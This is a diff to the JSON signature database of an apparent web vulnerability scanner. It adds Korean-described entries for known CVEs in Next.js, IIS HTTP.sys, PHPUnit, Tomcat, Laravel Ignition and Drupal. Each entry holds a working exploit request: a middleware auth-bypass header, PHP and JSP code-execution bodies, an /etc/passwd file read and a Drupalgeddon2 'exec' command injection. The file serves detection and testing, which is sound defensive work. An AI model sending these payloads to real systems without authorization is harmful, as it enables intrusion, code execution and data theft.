@@ -5114,6 +5114,108 @@
           }
         },
         {
+          "id": "cve_2025_29927_nextjs_mw",
+          "name": "CVE-2025-29927 Next.js 미들웨어 인증 우회",
+          "payload": "middleware:middleware:middleware:middleware:middleware",
+          "description": "x-middleware-subrequest 헤더로 미들웨어 기반 인증/리다이렉트를 건너뜀. 보호 페이지가 리다이렉트/403 대신 200 으로 열리면 우회 성공. 영향: Next.js 11.1.4~15.2.2.",
+          "risk": "critical",
+          "cve": "CVE-2025-29927",
+          "location": "header",
+          "param": "x-middleware-subrequest",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-29927",
+          "applies_to": {
+            "powered_by": ["next.js"],
+            "body_keywords": ["/_next/static", "__NEXT_DATA__"]
+          }
+        },
+        {
+          "id": "cve_2015_1635_httpsys",
+          "name": "CVE-2015-1635 (MS15-034) IIS HTTP.sys Range 정수 오버플로우",
+          "payload": "bytes=0-18446744073709551615",
+          "description": "거대 Range 요청에 416(Requested Range Not Satisfiable) 이 오면 취약(패치되면 400 Bad Request). 영향: Windows HTTP.sys(IIS).",
+          "risk": "high",
+          "cve": "CVE-2015-1635",
+          "location": "header",
+          "param": "Range",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-1635",
+          "applies_to": {
+            "server": ["microsoft-iis", "iis"]
+          }
+        },
+        {
+          "id": "cve_2017_9841_phpunit_evalstdin",
+          "name": "CVE-2017-9841 PHPUnit eval-stdin.php 원격 코드 실행",
+          "payload": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+          "description": "POST 본문의 PHP 코드가 그대로 실행됨. 본문 <?php echo md5(1); ?> → 응답에 c4ca4238a0b923820dcc509a6f75849b 가 나오면 RCE 성공.",
+          "risk": "critical",
+          "cve": "CVE-2017-9841",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
+          "applies_to": {
+            "always": true
+          },
+          "body": "<?php echo md5(1); ?>"
+        },
+        {
+          "id": "cve_2017_12615_tomcat_put",
+          "name": "CVE-2017-12615 Tomcat PUT 로 JSP 업로드(RCE)",
+          "payload": "/cve20171261.jsp/",
+          "description": "readonly=false 인 Tomcat 에 PUT 으로 .jsp/(후행 슬래시) 업로드. 201/204 면 업로드 성공 → 이후 /cve20171261.jsp 접근 시 본문 JSP 가 실행(7*191=1337).",
+          "risk": "critical",
+          "cve": "CVE-2017-12615",
+          "location": "path",
+          "param": "",
+          "method": "PUT",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-12615",
+          "applies_to": {
+            "server": ["apache-coyote", "tomcat"]
+          },
+          "body": "<% out.println(\"cve20171261-\"+(7*191)); %>"
+        },
+        {
+          "id": "cve_2021_3129_laravel_ignition",
+          "name": "CVE-2021-3129 Laravel Ignition 파일 읽기/RCE",
+          "payload": "/_ignition/execute-solution",
+          "description": "디버그 모드 Laravel 의 Ignition 엔드포인트로 임의 파일 읽기→RCE. viewFile=/etc/passwd 로 파일 노출 시 응답에 root:x:0:0. 영향: Laravel <8.4.2 + facade/ignition <2.5.2.",
+          "risk": "critical",
+          "cve": "CVE-2021-3129",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-3129",
+          "applies_to": {
+            "path_contains": ["_ignition"],
+            "body_keywords": ["laravel", "ignition"]
+          },
+          "body": "{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"cve\",\"viewFile\":\"/etc/passwd\"}}",
+          "headers": {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          }
+        },
+        {
+          "id": "cve_2018_7600_drupalgeddon2",
+          "name": "CVE-2018-7600 Drupal 7 Drupalgeddon2 원격 코드 실행",
+          "payload": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+          "description": "Form API 렌더 배열 주입으로 명령 실행(Drupal 7). 응답에 uid= 가 나오면 RCE 성공.",
+          "risk": "critical",
+          "cve": "CVE-2018-7600",
+          "location": "path",
+          "param": "",
+          "method": "POST",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
+          "applies_to": {
+            "powered_by": ["drupal"],
+            "body_keywords": ["drupal", "x-generator"]
+          },
+          "body": "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        },
+        {
           "id": "nuclei_cve_2026_19478",
           "name": "CVE-2026-19478 GitLab CE/EE - GraphQL @gl_introduced Arbitrary Method Invocation",
           "payload": "/api/v4/projects?visibility=public&per_page=1",
